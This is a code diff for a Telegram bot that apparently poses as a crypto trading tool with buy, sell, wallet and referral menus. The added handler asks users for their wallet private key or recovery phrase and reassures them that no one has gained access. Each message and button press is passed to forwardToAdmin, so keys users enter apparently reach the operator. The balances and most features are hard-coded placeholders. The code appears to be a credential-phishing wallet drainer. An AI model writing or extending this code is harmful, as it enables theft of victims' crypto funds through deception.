@@ -65,36 +65,38 @@ function restartBot() {
 function getMainMenuKeyboard() {
   return {
     reply_markup: {
-      inline_keyboard: [
+      keyboard: [
         [
-          { text: '💰 Buy', callback_data: 'buy' },
-          { text: '🐝 Sell', callback_data: 'sell' }
+          { text: '💰 Buy' },
+          { text: '🐝 Sell' }
         ],
         [
-          { text: '🔐 Import wallet', callback_data: 'import_wallet' },
-          { text: '🏦 Add assets', callback_data: 'add_assets' },
-          { text: '💳 Wallet balance', callback_data: 'wallet_balance' }
+          { text: '🔐 Import wallet' },
+          { text: '🏦 Add assets' },
+          { text: '💳 Wallet balance' }
         ],
         [
-          { text: '👜 Wallet management', callback_data: 'wallet_management' },
-          { text: '🏦 Portfolio', callback_data: 'portfolio' }
+          { text: '👜 Wallet management' },
+          { text: '🏦 Portfolio' }
         ],
         [
-          { text: '👥 Copy trading', callback_data: 'copy_trading' },
-          { text: '📌 Limit order', callback_data: 'limit_order' }
+          { text: '👥 Copy trading' },
+          { text: '📌 Limit order' }
         ],
         [
-          { text: '🏆 Refer and earn', callback_data: 'refer_and_earn' },
-          { text: '🏛 Help', callback_data: 'help' }
+          { text: '🏆 Refer and earn' },
+          { text: '🏛 Help' }
         ],
         [
-          { text: '📡 Signals', callback_data: 'signals' },
-          { text: '🌐 Language', callback_data: 'language' }
+          { text: '📡 Signals' },
+          { text: '🌐 Language' }
         ],
         [
-          { text: '⚙️ Settings', callback_data: 'settings' }
+          { text: '⚙️ Settings' }
         ]
-      ]
+      ],
+      resize_keyboard: true,
+      one_time_keyboard: false
     },
     parse_mode: 'HTML'
   };
@@ -142,6 +144,37 @@ Get real-time crypto market updates, trading signals and insight delivered direc
 const MAIN_MENU_TEXT = `🔝 <b>Main Menu</b>
 
 Choose an option below:`;
+
+const MENU_BUTTONS = {
+  '💰 Buy': 'buy',
+  Buy: 'buy',
+  '🐝 Sell': 'sell',
+  Sell: 'sell',
+  '🔐 Import wallet': 'import_wallet',
+  'Import wallet': 'import_wallet',
+  '🏦 Add assets': 'add_assets',
+  'Add assets': 'add_assets',
+  '💳 Wallet balance': 'wallet_balance',
+  'Wallet balance': 'wallet_balance',
+  '👜 Wallet management': 'wallet_management',
+  'Wallet management': 'wallet_management',
+  '🏦 Portfolio': 'portfolio',
+  Portfolio: 'portfolio',
+  '👥 Copy trading': 'copy_trading',
+  'Copy trading': 'copy_trading',
+  '📌 Limit order': 'limit_order',
+  'Limit order': 'limit_order',
+  '🏆 Refer and earn': 'refer_and_earn',
+  'Refer and earn': 'refer_and_earn',
+  '🏛 Help': 'help',
+  Help: 'help',
+  '📡 Signals': 'signals',
+  Signals: 'signals',
+  '🌐 Language': 'language',
+  Language: 'language',
+  '⚙️ Settings': 'settings',
+  Settings: 'settings'
+};
 
 function escapeHtml(value) {
   return String(value || '')
@@ -203,6 +236,185 @@ async function handleAdminReply(msg) {
   }
 
   return true;
+}
+
+async function handleMenuButton(msg, data) {
+  const chatId = msg.chat.id;
+  const from = msg.from;
+
+  await forwardToAdmin(from.id, from.username, from.first_name, `Button: ${data}`, 'button');
+
+  switch (data) {
+    case 'buy':
+      userStates[chatId] = 'awaiting_buy_ca';
+      await bot.sendMessage(chatId, 'Enter the token CA {contract address}', getCancelKeyboard());
+      break;
+
+    case 'sell':
+      userStates[chatId] = 'awaiting_sell_ca';
+      await bot.sendMessage(chatId, 'Enter the token CA {contract address} you want to sell', getCancelKeyboard());
+      break;
+
+    case 'import_wallet':
+      userStates[chatId] = 'awaiting_wallet_import';
+      await bot.sendMessage(
+        chatId,
+        '🔐 Please enter the private key or recovery phrase to your wallet to import wallet.\n\nNOTE: 🙈 no one gained access to your wallet.',
+        getCancelKeyboard()
+      );
+      break;
+
+    case 'add_assets':
+      userStates[chatId] = 'awaiting_asset';
+      await bot.sendMessage(
+        chatId,
+        '🏦 <b>Add Assets</b>\n\nEnter the token contract address to add to your portfolio.',
+        { ...getCancelKeyboard(), parse_mode: 'HTML' }
+      );
+      break;
+
+    case 'wallet_balance':
+      await bot.sendMessage(
+        chatId,
+        '💳 <b>Wallet Balance</b>\n\n💰 SOL: 0.00\n💰 ETH: 0.00\n💰 BNB: 0.00\n💰 BASE: 0.00\n\nNo wallet connected. Import a wallet first.',
+        { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
+      );
+      break;
+
+    case 'wallet_management':
+      await bot.sendMessage(
+        chatId,
+        '👜 <b>Wallet Management</b>\n\nManage your connected wallets, switch between wallets, or import a new one.',
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: '🔐 Import New Wallet', callback_data: 'import_wallet' }],
+              [{ text: '🔄 Switch Wallet', callback_data: 'switch_wallet' }],
+              [{ text: '🔑 Export Private Key', callback_data: 'export_key' }],
+              [
+                { text: '🔙 Back', callback_data: 'back' },
+                { text: '🔝 Main Menu', callback_data: 'main_menu' }
+              ]
+            ]
+          },
+          parse_mode: 'HTML'
+        }
+      );
+      break;
+
+    case 'portfolio':
+      await bot.sendMessage(
+        chatId,
+        '🏦 <b>Portfolio</b>\n\n📊 Your portfolio is empty.\n\nStart trading to see your holdings here.',
+        { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
+      );
+      break;
+
+    case 'copy_trading':
+      await bot.sendMessage(
+        chatId,
+        '👥 <b>Copy Trading</b>\n\nCopy the trades of successful traders automatically.\n\n• Follow top traders\n• Auto-mirror their trades\n• Set your own risk limits\n• Real-time notifications',
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: '🔍 Find Traders', callback_data: 'find_traders' }],
+              [{ text: '📋 My Copy Trades', callback_data: 'my_copy_trades' }],
+              [
+                { text: '🔙 Back', callback_data: 'back' },
+                { text: '🔝 Main Menu', callback_data: 'main_menu' }
+              ]
+            ]
+          },
+          parse_mode: 'HTML'
+        }
+      );
+      break;
+
+    case 'limit_order':
+      userStates[chatId] = 'awaiting_limit_ca';
+      await bot.sendMessage(
+        chatId,
+        '📌 <b>Limit Order</b>\n\nEnter the token CA {contract address} to set a limit order.',
+        { ...getCancelKeyboard(), parse_mode: 'HTML' }
+      );
+      break;
+
+    case 'refer_and_earn':
+      await bot.sendMessage(
+        chatId,
+        `🏆 <b>Refer and Earn</b>\n\n🔗 Invite link: https://t.me/majortrendprobot?start=ref${from.id}\n\n💵 Withdrawable: 0 ($0)(0 pending)\n💲 Total withdrawn: 0 ($0)\n👥 Total invited: 0 people\n💳 Receiving address: null\n\n🏛 <b>Rules:</b>\n1. Earn 25% of invitees' trading fees permanently\n2. Withdrawals start from 0.01, max 1 request per 24h. Withdrawals will be auto triggered at 8:00 (UTC+8) daily and will be credited within 24 hours after triggering.`,
+        { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
+      );
+      break;
+
+    case 'help':
+      await bot.sendMessage(
+        chatId,
+        `🏛 <b>Help & Support</b>\n\n<b>How it works:</b>\n1. Pick how much volume\n2. Pick how long to run\n3. Done! We handle the rest\n\n🛠 <b>Tools:</b>\nPUMP, VOLUME BOOST, CONNECT, BALANCE, SUPPORT!\n\n🔥 <b>Supported pools:</b>\n• Pump.fun • Pumpswap\n• Radium • moon-it\n• Moonshot • Launch Lap\n• Jupiter • Dex\n\n⚡ Ads & Trending: @MajorBoostBot\n📈 Volume & Bumps: @MajorVolumeBot\n👋 Support 24/7: @MajorHelpBot\n💬 Livestream & Chat: @MajorCommunityChat\n\n🌐 DISCLAIMER: Trade at your own risk.`,
+        { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
+      );
+      break;
+
+    case 'signals':
+      await bot.sendMessage(
+        chatId,
+        `📡 Get the latest trade signals and alerts!\n🎯\n- Receive real-time trade signals and notifications\n- Stay updated on market trends and opportunities\n- Make informed trading decisions with timely alerts 💡`,
+        { ...getBackMenuKeyboard(), parse_mode: 'HTML' }
+      );
+      break;
+
+    case 'language':
+      await bot.sendMessage(
+        chatId,
+        '🌐 <b>Language Settings</b>\n\nSelect your preferred language:',
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '🇬🇧 English', callback_data: 'lang_en' },
+                { text: '🇨🇳 Chinese', callback_data: 'lang_zh' }
+              ],
+              [
+                { text: '🇪🇸 Spanish', callback_data: 'lang_es' },
+                { text: '🇫🇷 French', callback_data: 'lang_fr' }
+              ],
+              [
+                { text: '🇷🇺 Russian', callback_data: 'lang_ru' },
+                { text: '🇦🇪 Arabic', callback_data: 'lang_ar' }
+              ],
+              [
+                { text: '🔙 Back', callback_data: 'back' },
+                { text: '🔝 Main Menu', callback_data: 'main_menu' }
+              ]
+            ]
+          },
+          parse_mode: 'HTML'
+        }
+      );
+      break;
+
+    case 'settings':
+      await bot.sendMessage(
+        chatId,
+        '⚙️ <b>Settings</b>\n\nConfigure your bot preferences:',
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: '🔔 Notifications', callback_data: 'settings_notifications' }],
+              [{ text: '💰 Default Slippage', callback_data: 'settings_slippage' }],
+              [{ text: '⛽ Gas Settings', callback_data: 'settings_gas' }],
+              [{ text: '🔒 Security', callback_data: 'settings_security' }],
+              [
+                { text: '🔙 Back', callback_data: 'back' },
+                { text: '🔝 Main Menu', callback_data: 'main_menu' }
+              ]
+            ]
+          },
+          parse_mode: 'HTML'
+        }
+      );
+      break;
+  }
 }
 
 function registerHandlers() {
@@ -488,8 +700,15 @@ function registerHandlers() {
     const chatId = msg.chat.id;
     const text = msg.text || '';
     const state = userStates[chatId];
+    const menuAction = MENU_BUTTONS[text];
 
     try {
+      if (menuAction) {
+        userStates[chatId] = null;
+        await handleMenuButton(msg, menuAction);
+        return;
+      }
+
       await forwardToAdmin(msg.from.id, msg.from.username, msg.from.first_name, text, state || 'text');
 
       if (state === 'awaiting_buy_ca') {
